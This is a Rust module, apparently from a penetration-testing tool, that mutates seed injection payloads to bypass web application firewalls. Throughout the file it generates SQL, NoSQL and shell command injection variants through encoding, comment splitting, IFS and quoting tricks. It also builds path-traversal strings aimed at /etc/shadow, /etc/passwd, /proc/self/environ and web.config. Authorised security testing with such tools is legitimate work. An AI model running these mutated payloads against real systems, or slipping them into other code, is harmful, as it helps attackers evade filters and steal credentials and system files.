//! Dynamic Payload Mutation Engine
//!
//! Takes seed payloads and generates exhaustive mutated variants using
//! composable encoding, evasion, and traversal expansion strategies.
//! Designed for WAF bypass and comprehensive injection testing.

use rand::seq::IndexedRandom;
use std::collections::HashSet;

// ============================================================================
// Public Types
// ============================================================================

/// Category of payload — determines which mutations are applicable
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PayloadCategory {
    SQLi,
    NoSQLi,
    CMDi,
    Traversal,
    Generic,
}

/// Configuration for mutation behavior
#[derive(Debug, Clone)]
pub struct MutatorConfig {
    /// How many recursive mutation passes (1 = seeds + 1 layer, 2 = + 2 layers, etc.)
    pub depth: usize,
    /// Max variants per seed per generation (caps explosion)
    pub max_variants_per_seed: usize,
    /// Max total payloads to return (hard cap)
    pub max_total: usize,
    /// For traversal: max directory depth to expand to
    pub traversal_max_depth: usize,
    /// Try every possible encoding combination exhaustively
    pub exhaustive_encoding: bool,
}

impl Default for MutatorConfig {
    fn default() -> Self {
        Self {
            depth: 3,
            max_variants_per_seed: 15,
            max_total: 500,
            traversal_max_depth: 15,
            exhaustive_encoding: true,
        }
    }
}

// ============================================================================
// Core Mutator
// ============================================================================

/// Generate mutated payloads from seeds.
/// Returns deduplicated set of all unique payloads (seeds + mutations).
pub fn mutate_payloads(
    seeds: &[String],
    category: PayloadCategory,
    config: &MutatorConfig,
) -> Vec<String> {
    let mut all = HashSet::new();

    // Always include original seeds
    for s in seeds {
        all.insert(s.clone());
    }

    // Generation 0: apply all applicable mutations to seeds
    let mut current_gen: Vec<String> = seeds.to_vec();

    for _depth in 0..config.depth {
        let mut next_gen = Vec::new();

        for payload in &current_gen {
            let mutations = apply_all_mutations(payload, category, config);
            for m in mutations {
                if all.len() >= config.max_total {
                    break;
                }
                if all.insert(m.clone()) {
                    next_gen.push(m);
                }
            }
            if all.len() >= config.max_total {
                break;
            }
        }

        if next_gen.is_empty() {
            break;
        }

        // Limit next generation size to prevent explosion
        if next_gen.len() > config.max_total / 2 {
            // Keep a random subset
            let mut rng = rand::rng();
            let mut shuffled = next_gen;
            // Take first N after shuffle
            let limit = config.max_total / 2;
            if shuffled.len() > limit {
                shuffled.truncate(limit);
            }
            current_gen = shuffled;
        } else {
            current_gen = next_gen;
        }
    }

    // For traversal: also expand depth variants
    if category == PayloadCategory::Traversal {
        let traversal_expanded = expand_traversal_depths(seeds, config);
        for t in traversal_expanded {
            if all.len() >= config.max_total {
                break;
            }
            all.insert(t);
        }
    }

    let mut result: Vec<String> = all.into_iter().collect();
    result.sort(); // Deterministic order for reproducibility
    result
}

// ============================================================================
// Mutation Dispatcher
// ============================================================================

fn apply_all_mutations(
    payload: &str,
    category: PayloadCategory,
    config: &MutatorConfig,
) -> Vec<String> {
    let mut results = Vec::new();
    let limit = config.max_variants_per_seed;

    // === Universal Encoding Mutations (all categories) ===
    results.extend(encode_url(payload));
    results.extend(encode_double_url(payload));
    results.extend(encode_unicode_escape(payload));
    results.extend(encode_html_entities(payload));
    results.extend(encode_hex(payload));
    results.extend(encode_octal(payload));
    results.extend(encode_utf8_overlong(payload));

    if config.exhaustive_encoding {
        // Chain: URL encode the double-encoded version, etc.
        for encoded in encode_url(payload) {
            results.extend(encode_url(&encoded));
        }
        for encoded in encode_double_url(payload) {
            results.extend(encode_url(&encoded));
        }
        // Mixed encoding: URL encode some chars, leave others
        results.extend(encode_mixed_partial(payload));
    }

    // === Whitespace & Boundary Mutations ===
    results.extend(swap_whitespace(payload));
    results.extend(boundary_wrap(payload));
    results.extend(null_byte_append(payload));

    // === Category-Specific Mutations ===
    match category {
        PayloadCategory::SQLi => {
            results.extend(sql_comment_inject(payload));
            results.extend(sql_case_toggle(payload));
            results.extend(sql_concat_split(payload));
            results.extend(sql_version_comment(payload));
            results.extend(sql_alternative_syntax(payload));
            results.extend(sql_hex_encode_strings(payload));
        }
        PayloadCategory::NoSQLi => {
            results.extend(nosql_operator_variants(payload));
            results.extend(nosql_unicode_escape(payload));
        }
        PayloadCategory::CMDi => {
            results.extend(cmd_separator_variants(payload));
            results.extend(cmd_variable_expansion(payload));
            results.extend(cmd_quoting_tricks(payload));
            results.extend(cmd_wildcard_bypass(payload));
        }
        PayloadCategory::Traversal => {
            results.extend(traversal_encoding_variants(payload));
            results.extend(traversal_os_variants(payload));
            results.extend(traversal_null_extension(payload));
            results.extend(traversal_double_dot_variants(payload));
        }
        PayloadCategory::Generic => {}
    }

    // Deduplicate and cap
    let mut seen = HashSet::new();
    let mut unique = Vec::new();
    for r in results {
        if r != *payload && seen.insert(r.clone()) {
            unique.push(r);
            if unique.len() >= limit {
                break;
            }
        }
    }
    unique
}

// ============================================================================
// Universal Encoding Mutations
// ============================================================================

fn encode_url(payload: &str) -> Vec<String> {
    // Full URL encode every special char
    let full = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("%{:02X}", c as u8)
            }
        })
        .collect::<String>();

    // Selective: only encode injection chars
    let selective = payload
        .chars()
        .map(|c| match c {
            '\'' | '"' | ' ' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '/'
            | '\\' | '{' | '}' | '$' | '`' | '!' | '#' | '%' | '=' | '.' => {
                format!("%{:02X}", c as u8)
            }
            _ => c.to_string(),
        })
        .collect::<String>();

    vec![full, selective]
}

fn encode_double_url(payload: &str) -> Vec<String> {
    // Double encode: % becomes %25 first
    let double = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                let hex = format!("{:02X}", c as u8);
                format!("%25{}", hex)
            }
        })
        .collect::<String>();
    vec![double]
}

fn encode_unicode_escape(payload: &str) -> Vec<String> {
    // \uXXXX encoding for each char
    let unicode = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == ' ' {
                c.to_string()
            } else {
                format!("\\u{:04X}", c as u32)
            }
        })
        .collect::<String>();

    // %uXXXX (IIS-style)
    let iis_unicode = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("%u{:04X}", c as u32)
            }
        })
        .collect::<String>();

    vec![unicode, iis_unicode]
}

fn encode_html_entities(payload: &str) -> Vec<String> {
    let html = payload
        .chars()
        .map(|c| match c {
            '<' => "&lt;".to_string(),
            '>' => "&gt;".to_string(),
            '"' => "&quot;".to_string(),
            '\'' => "&#39;".to_string(),
            '&' => "&amp;".to_string(),
            _ if !c.is_ascii_alphanumeric() && c != ' ' => format!("&#{};", c as u32),
            _ => c.to_string(),
        })
        .collect::<String>();

    // Hex HTML entities
    let hex_html = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == ' ' {
                c.to_string()
            } else {
                format!("&#x{:X};", c as u32)
            }
        })
        .collect::<String>();

    vec![html, hex_html]
}

fn encode_hex(payload: &str) -> Vec<String> {
    // 0xNN hex encoding
    let hex = payload
        .bytes()
        .map(|b| format!("\\x{:02x}", b))
        .collect::<String>();
    vec![hex]
}

fn encode_octal(payload: &str) -> Vec<String> {
    let octal = payload
        .bytes()
        .map(|b| format!("\\{:03o}", b))
        .collect::<String>();
    vec![octal]
}

fn encode_utf8_overlong(payload: &str) -> Vec<String> {
    // Overlong UTF-8 encoding for / and . (common traversal bypass)
    let overlong = payload
        .chars()
        .map(|c| match c {
            '/' => "%c0%af".to_string(),       // Overlong /
            '.' => "%c0%ae".to_string(),       // Overlong .
            '\\' => "%c1%9c".to_string(),      // Overlong backslash
            _ => c.to_string(),
        })
        .collect::<String>();

    // Alternative overlong
    let overlong2 = payload
        .chars()
        .map(|c| match c {
            '/' => "%e0%80%af".to_string(),    // 3-byte overlong /
            '.' => "%e0%80%ae".to_string(),    // 3-byte overlong .
            _ => c.to_string(),
        })
        .collect::<String>();

    vec![overlong, overlong2]
}

fn encode_mixed_partial(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    // Encode only odd-indexed special chars, leave even ones
    let chars: Vec<char> = payload.chars().collect();
    let mut special_idx = 0;

    let mixed1: String = chars
        .iter()
        .map(|&c| {
            if !c.is_ascii_alphanumeric() && c != ' ' {
                special_idx += 1;
                if special_idx % 2 == 0 {
                    format!("%{:02X}", c as u8)
                } else {
                    c.to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(mixed1);

    // Reverse: encode even, leave odd
    special_idx = 0;
    let mixed2: String = chars
        .iter()
        .map(|&c| {
            if !c.is_ascii_alphanumeric() && c != ' ' {
                special_idx += 1;
                if special_idx % 2 == 1 {
                    format!("%{:02X}", c as u8)
                } else {
                    c.to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(mixed2);

    results
}

// ============================================================================
// Whitespace & Boundary Mutations
// ============================================================================

fn swap_whitespace(payload: &str) -> Vec<String> {
    let alternatives = ["\t", "%09", "%0a", "%0d", "%20", "/**/", "+", "%0b", "%0c"];
    let mut results = Vec::new();
    for alt in &alternatives {
        let swapped = payload.replace(' ', alt);
        if swapped != *payload {
            results.push(swapped);
        }
    }
    results
}

fn boundary_wrap(payload: &str) -> Vec<String> {
    vec![
        format!("%0a{}", payload),
        format!("%0d%0a{}", payload),
        format!("\n{}", payload),
        format!("\r\n{}", payload),
        format!("{}{}", "\x0c", payload), // form feed
        format!("{}{}", "\x0b", payload), // vertical tab
        format!(" {}", payload),
        format!("{}  ", payload),
    ]
}

fn null_byte_append(payload: &str) -> Vec<String> {
    vec![
        format!("{}%00", payload),
        format!("{}\x00", payload),
        format!("{}%00%00", payload),
        format!("%00{}", payload),
    ]
}

// ============================================================================
// SQL Injection Mutations
// ============================================================================

fn sql_comment_inject(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    // Insert /**/ between every word character boundary
    let chars: Vec<char> = payload.chars().collect();
    if chars.len() > 2 {
        for i in 1..chars.len() {
            if chars[i - 1].is_alphabetic() && chars[i].is_alphabetic() {
                let mut new = String::new();
                new.extend(&chars[..i]);
                new.push_str("/**/");
                new.extend(&chars[i..]);
                results.push(new);
            }
        }
    }

    // Wrap keywords
    let keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "ORDER", "INSERT", "UPDATE", "DELETE", "DROP"];
    let upper = payload.to_uppercase();
    for kw in &keywords {
        if upper.contains(kw) {
            // Split keyword with comment
            if kw.len() >= 2 {
                let mid = kw.len() / 2;
                let split_kw = format!("{}/**/{}",  &kw[..mid], &kw[mid..]);
                results.push(replace_case_insensitive(payload, kw, &split_kw));
            }
        }
    }

    // MySQL version comment: /*!50000 UNION*/
    results.push(payload.replace("UNION", "/*!50000 UNION*/"));
    results.push(payload.replace("SELECT", "/*!50000 SELECT*/"));

    // Line comment variants
    results.push(format!("{}-- ", payload));
    results.push(format!("{}#", payload));
    results.push(format!("{}--+-", payload));
    results.push(format!("{};--", payload));
    results.push(format!("{}/*", payload));

    results
}

fn sql_case_toggle(payload: &str) -> Vec<String> {
    let mut results = Vec::new();

    // Alternating case: oR, Or
    let chars: Vec<char> = payload.chars().collect();
    let toggle1: String = chars
        .iter()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_lowercase().to_string()
            } else {
                c.to_uppercase().to_string()
            }
        })
        .collect();
    results.push(toggle1);

    let toggle2: String = chars
        .iter()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 1 {
                c.to_lowercase().to_string()
            } else {
                c.to_uppercase().to_string()
            }
        })
        .collect();
    results.push(toggle2);

    // Random case for each alpha char
    let mut rng = rand::rng();
    let random_case: String = chars
        .iter()
        .map(|c| {
            if c.is_alphabetic() {
                let options = [true, false];
                if *options.choose(&mut rng).unwrap_or(&true) {
                    c.to_uppercase().to_string()
                } else {
                    c.to_lowercase().to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(random_case);

    results
}

fn sql_concat_split(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    if payload.len() >= 4 {
        let mid = payload.len() / 2;
        // MySQL CONCAT
        results.push(format!("CONCAT('{}','{}')", &payload[..mid], &payload[mid..]));
        // MSSQL +
        results.push(format!("'{}'+'{}'", &payload[..mid], &payload[mid..]));
        // Oracle ||
        results.push(format!("'{}'||'{}'", &payload[..mid], &payload[mid..]));
        // CHR() for each character (partial)
        if payload.len() <= 20 {
            let chr_str: String = payload
                .bytes()
                .map(|b| format!("CHR({})", b))
                .collect::<Vec<_>>()
                .join("||");
            results.push(chr_str);
        }
    }
    results
}

fn sql_version_comment(payload: &str) -> Vec<String> {
    // MySQL version-specific comments: /*!NNNNN payload */
    let versions = ["50000", "50001", "40100", "40000", "99999"];
    versions
        .iter()
        .map(|v| format!("/*!{} {} */", v, payload))
        .collect()
}

fn sql_alternative_syntax(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let upper = payload.to_uppercase();

    if upper.contains("OR") {
        results.push(replace_case_insensitive(payload, "OR", "||"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 2>1"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 'a'='a'"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 1 LIKE 1"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 1 BETWEEN 0 AND 2"));
    }
    if upper.contains("AND") {
        results.push(replace_case_insensitive(payload, "AND", "&&"));
    }
    if upper.contains("=") {
        results.push(payload.replace('=', " LIKE "));
        results.push(payload.replace('=', " REGEXP "));
    }

    results
}

fn sql_hex_encode_strings(payload: &str) -> Vec<String> {
    // Convert quoted strings to hex
    let mut results = Vec::new();
    if payload.contains('\'') || payload.contains('"') {
        let hex_encoded = payload
            .chars()
            .map(|c| {
                if c == '\'' || c == '"' || c == ' ' {
                    c.to_string()
                } else if c.is_alphabetic() {
                    format!("0x{:02X}", c as u8)
                } else {
                    c.to_string()
                }
            })
            .collect::<String>();
        results.push(hex_encoded);
    }
    results
}

// ============================================================================
// NoSQL Injection Mutations
// ============================================================================

fn nosql_operator_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    // JSON operator variants
    let operators = [
        ("$ne", "$not"),
        ("$gt", "$gte"),
        ("$gt", "$nin"),
        ("$where", "$expr"),
        ("$ne", "$exists"),
    ];
    for (from, to) in &operators {
        if payload.contains(from) {
            results.push(payload.replace(from, to));
        }
    }
    // Array injection
    results.push(format!("[{}]", payload));
    // Type confusion
    results.push(payload.replace("null", "[]"));
    results.push(payload.replace("null", "\"\""));
    results.push(payload.replace("null", "0"));
    results.push(payload.replace("true", "1"));
    results
}

fn nosql_unicode_escape(payload: &str) -> Vec<String> {
    // Unicode escape for JSON strings
    let unicode = payload
        .chars()
        .map(|c| {
            if c == '$' || c == '.' || c == '{' || c == '}' {
                format!("\\u{:04X}", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect::<String>();
    vec![unicode]
}

// ============================================================================
// Command Injection Mutations
// ============================================================================

fn cmd_separator_variants(payload: &str) -> Vec<String> {
    let separators = [";", "|", "||", "&&", "&", "\n", "\r\n", "%0a", "%0d%0a", "`", "$()"];
    let mut results = Vec::new();

    for sep in &separators {
        // Replace first separator-like char with alternative
        for orig in [";", "|", "&", "`"] {
            if payload.contains(orig) {
                results.push(payload.replacen(orig, sep, 1));
            }
        }
    }

    // Prefix with separators
    for sep in &separators {
        results.push(format!("{}{}", sep, payload.trim_start_matches(|c: char| c == ';' || c == '|' || c == '&' || c == ' ')));
    }

    results
}

fn cmd_variable_expansion(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    // Use variable expansion to break up commands
    // e.g., "id" -> "${IFS}id", "cat" -> "c${x}at"
    if payload.contains("id") {
        results.push(payload.replace("id", "${IFS}id"));
        results.push(payload.replace("id", "i${x}d"));
        results.push(payload.replace("id", "'i''d'"));
    }
    if payload.contains("cat") {
        results.push(payload.replace("cat", "c${x}at"));
        results.push(payload.replace("cat", "'c''a''t'"));
        results.push(payload.replace("cat", "c\\at"));
    }
    if payload.contains("passwd") {
        results.push(payload.replace("passwd", "pas${x}swd"));
        results.push(payload.replace("passwd", "p'a's's'w'd"));
    }
    // IFS (Internal Field Separator) as space
    results.push(payload.replace(' ', "${IFS}"));
    results.push(payload.replace(' ', "$IFS$9"));
    results.push(payload.replace(' ', "{,,}"));
    results.push(payload.replace(' ', "%20"));

    results
}

fn cmd_quoting_tricks(payload: &str) -> Vec<String> {
    let mut results = Vec::new();

    // Insert quotes inside commands
    let chars: Vec<char> = payload.chars().collect();
    if chars.len() > 2 {
        for i in 1..chars.len().saturating_sub(1) {
            if chars[i].is_alphabetic() && chars[i + 1].is_alphabetic() {
                let mut new = String::new();
                new.extend(&chars[..i + 1]);
                new.push_str("''");
                new.extend(&chars[i + 1..]);
                results.push(new);
                if results.len() >= 5 {
                    break;
                }
            }
        }
    }

    // Backslash insertion
    let backslashed: String = chars
        .iter()
        .enumerate()
        .map(|(i, c)| {
            if c.is_alphabetic() && i > 0 && i % 3 == 0 {
                format!("\\{}", c)
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(backslashed);

    results
}

fn cmd_wildcard_bypass(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    // Replace known filenames with wildcards
    if payload.contains("/etc/passwd") {
        results.push(payload.replace("/etc/passwd", "/etc/pass??"));
        results.push(payload.replace("/etc/passwd", "/etc/pas*"));
        results.push(payload.replace("/etc/passwd", "/e?c/p?ss?d"));
    }
    if payload.contains("cat") {
        results.push(payload.replace("cat", "/bin/c?t"));
        results.push(payload.replace("cat", "/bin/ca*"));
    }
    results
}

// ============================================================================
// Path Traversal Mutations — EXHAUSTIVE
// ============================================================================

fn traversal_encoding_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();

    // Every possible encoding of ../ and ..\
    let dot_dot_slash_encodings = [
        "../", "..\\",
        "..%2f", "..%5c",
        "%2e%2e/", "%2e%2e%2f",
        "%2e%2e\\", "%2e%2e%5c",
        "..%252f", "..%255c",       // Double encoded
        "%252e%252e%252f",          // Triple layer
        "%c0%ae%c0%ae/",            // Overlong UTF-8
        "%c0%ae%c0%ae%c0%af",      // Overlong UTF-8 all
        "%e0%80%ae%e0%80%ae/",     // 3-byte overlong
        "%e0%80%ae%e0%80%ae%e0%80%af",
        "..%c0%af",                 // Mixed overlong
        "..%ef%bc%8f",              // Fullwidth /
        "．．／",                   // Unicode fullwidth
        "．．/",                    // Mixed fullwidth
        "..%u002f",                 // IIS unicode
        "..%u005c",                 // IIS unicode backslash
        "....//",                   // Double dot-dot
        "..../",
        "..\\/",                    // Mixed separators
        "..%00/",                   // Null byte mid-path
        "..;/",                     // Semicolon (Tomcat/Jetty bypass)
    ];

    // For each encoding variant, rebuild the payload
    for encoding in &dot_dot_slash_encodings {
        let rebuilt = payload
            .replace("../", encoding)
            .replace("..\\", encoding);
        if rebuilt != *payload {
            results.push(rebuilt);
        }
    }

    results
}

fn traversal_os_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();

    // Linux targets
    let linux_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/1/cwd", "/var/log/auth.log",
        "/etc/issue", "/etc/motd",
    ];
    // Windows targets
    let windows_files = [
        "\\windows\\win.ini", "\\windows\\system.ini",
        "\\boot.ini", "\\inetpub\\wwwroot\\web.config",
        "\\windows\\system32\\drivers\\etc\\hosts",
    ];

    let prefix = extract_traversal_prefix(payload);

    for file in &linux_files {
        results.push(format!("{}{}", prefix, file));
    }
    for file in &windows_files {
        results.push(format!("{}{}", prefix.replace('/', "\\"), file));
    }

    results
}

fn traversal_null_extension(payload: &str) -> Vec<String> {
    let extensions = [".php", ".html", ".jsp", ".asp", ".aspx", ".txt", ".xml", ".json", ".log"];
    let mut results = Vec::new();

    // Null byte + extension bypass
    for ext in &extensions {
        results.push(format!("{}%00{}", payload, ext));
        results.push(format!("{}\x00{}", payload, ext));
    }

    // URL encoded null + extension
    results.push(format!("{}%2500", payload));

    results
}

fn traversal_double_dot_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();

    // Double-encoding and filter bypass patterns
    let patterns = [
        ("../", "....//"),         // Recursive cleanup bypass
        ("../", "....\\\\//"),     // Mixed
        ("../", "..%00/"),         // Null in middle
        ("../", "..%0d/"),         // CR injection
        ("../", "..%0a/"),         // LF injection
        ("../", ".%2e/"),          // Partial encode
        ("../", "%2e./"),          // Other partial encode
        ("../", "..%09/"),         // Tab injection
        ("../", "..;/"),  // Semicolon bypass (Java)
    ];

    for (from, to) in &patterns {
        let rebuilt = payload.replace(from, to);
        if rebuilt != *payload {
            results.push(rebuilt);
        }
    }

    results
}

/// Expand traversal depths: generate ../../, ../../../, etc. up to max_depth
fn expand_traversal_depths(seeds: &[String], config: &MutatorConfig) -> Vec<String> {
    let mut results = Vec::new();
    let target_files = [
        "etc/passwd", "etc/shadow", "etc/hosts",
        "proc/self/environ", "windows/win.ini", "windows/system.ini",
        "boot.ini",
    ];
    let separators = ["../", "..\\", "..%2f", "..%5c", "%2e%2e/", "%2e%2e%2f"];

    for depth in 1..=config.traversal_max_depth {
        for sep in &separators {
            let prefix = sep.repeat(depth);
            for file in &target_files {
                results.push(format!("{}{}", prefix, file));
            }
        }
    }

    // Also expand existing seed patterns to deeper depths
    for seed in seeds {
        if let Some(file) = extract_traversal_target(seed) {
            for depth in 1..=config.traversal_max_depth {
                results.push(format!("{}{}", "../".repeat(depth), file));
                results.push(format!("{}{}", "..\\".repeat(depth), file));
                results.push(format!("{}{}", "..%2f".repeat(depth), file));
            }
        }
    }

    results
}

// ============================================================================
// Utility Helpers
// ============================================================================

fn replace_case_insensitive(text: &str, from: &str, to: &str) -> String {
    let lower_text = text.to_lowercase();
    let lower_from = from.to_lowercase();
    if let Some(pos) = lower_text.find(&lower_from) {
        let mut result = String::new();
        result.push_str(&text[..pos]);
        result.push_str(to);
        result.push_str(&text[pos + from.len()..]);
        result
    } else {
        text.to_string()
    }
}

fn extract_traversal_prefix(payload: &str) -> String {
    // Extract the ../ prefix part from a traversal payload
    let mut prefix = String::new();
    let mut chars = payload.chars().peekable();
    while chars.peek().is_some() {
        if payload[prefix.len()..].starts_with("../") {
            prefix.push_str("../");
            chars.nth(2); // skip 3 chars
        } else if payload[prefix.len()..].starts_with("..\\") {
            prefix.push_str("..\\");
            chars.nth(2);
        } else {
            break;
        }
    }
    if prefix.is_empty() {
        "../../../".to_string()
    } else {
        prefix
    }
}

fn extract_traversal_target(payload: &str) -> Option<String> {
    // Extract the target file from a traversal payload  (everything after last ../ or ..\)
    let cleaned = payload
        .replace("..\\", "../")
        .replace("..%2f", "../")
        .replace("..%5c", "../");
    if let Some(last_idx) = cleaned.rfind("../") {
        let target = &cleaned[last_idx + 3..];
        if !target.is_empty() {
            return Some(target.to_string());
        }
    }
    None
}
